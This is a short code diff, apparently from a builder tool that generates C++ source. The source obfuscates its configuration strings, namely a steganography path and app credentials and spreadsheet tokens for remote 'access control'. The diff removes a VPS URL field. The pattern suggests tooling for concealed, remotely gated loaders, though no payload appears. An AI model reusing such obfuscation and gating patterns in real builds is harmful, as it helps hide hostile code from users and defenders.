@@ -201,7 +201,6 @@ static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
 // 准入控制配置
 static std::string AppID = ENCRYPT_STR("{app_id}");
 static std::string AppSecret = ENCRYPT_STR("{app_secret}");
-static std::string VpsUrl = ENCRYPT_STR("{vps_url}");
 static std::string SheetID = ENCRYPT_STR("{sheet_id}");
 static std::string SpreadsheetToken = ENCRYPT_STR("{spreadsheet_token}");
 // ==================== CONFIG END ==========================
@@ -224,7 +223,6 @@ static std::string SpreadsheetToken = ENCRYPT_STR("{spreadsheet_token}");
             steg_path=settings['steg_path'] if settings['steg_path'] else "",
             app_id=settings['app_id'] if settings['app_id'] else "",
             app_secret=settings['app_secret'] if settings['app_secret'] else "",
-            vps_url=settings['vps_url'] if settings['vps_url'] else "",
             sheet_id=settings['sheet_id'] if settings['sheet_id'] else "",
             spreadsheet_token=settings['spreadsheet_token'] if settings['spreadsheet_token'] else ""
         )
@@ -251,7 +249,6 @@ static std::string SpreadsheetToken = ENCRYPT_STR("{spreadsheet_token}");
             'enable_access_control': window.access_control_check.isChecked(),
             'app_id': window.app_id_edit.text() if hasattr(window, 'app_id_edit') else "",
             'app_secret': window.app_secret_edit.text() if hasattr(window, 'app_secret_edit') else "",
-            'vps_url': window.vps_url_edit.text() if hasattr(window, 'vps_url_edit') else "",
             'sheet_id': window.sheet_id_edit.text() if hasattr(window, 'sheet_id_edit') else "",
             'spreadsheet_token': window.spreadsheet_token_edit.text() if hasattr(window, 'spreadsheet_token_edit') else "",
             'steg_path': window.steg_name.text()
